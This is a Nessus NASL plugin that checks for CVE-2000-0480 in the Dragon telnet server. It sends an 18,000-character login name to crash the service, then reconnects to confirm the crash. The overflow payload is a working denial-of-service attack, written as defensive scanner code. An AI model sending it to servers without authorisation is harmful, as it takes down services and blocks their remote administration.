#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10451);
 script_bugtraq_id(1352);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2000-0480");
 name["english"] = "Dragon telnet overflow";
 name["francais"] = "Dragon telnet overflow";
 
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to
shut down the remote telnet server by issuing
a far too long login name (over 16,000 chars)

This problem allows an attacker to prevent
remote administration of this host.

Solution : upgrade to the latest version your telnet server.

Risk factor : High";


 desc["francais"] = "Il s'est avéré possible
de couper le serveur telnet distant en 
donnant un nom de login beaucoup trop
long.

Ce problème permet à des pirates en herbe
d'empecher ce serveur d'etre administré
à distance.

Solution : mettez à jour votre serveur telnet.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts a USER buffer overflows";
 summary["francais"] = "Essaye un USER buffers overflows";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/telnet", 23);
 exit(0);
}

include('telnet_func.inc');
include('global_settings.inc');
port = get_kb_item("Services/telnet");
if(!port)port = 23;

if ( report_paranoia < 2 ) exit(0);

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = telnet_negotiate(socket:soc);
  r2 = recv(socket:soc, length:4096);
  r = r + r2;
  if(r)
  {
  req = string(crap(18000), "\r\n");
  send(socket:soc, data:req);
  close(soc);
  sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else {
  	r = telnet_negotiate(socket:soc2);
	r2 = recv(socket:soc2, length:4096);
	r = r + r2;
  	close(soc2);
	if(!r)security_hole(port);
      }
  }  
}

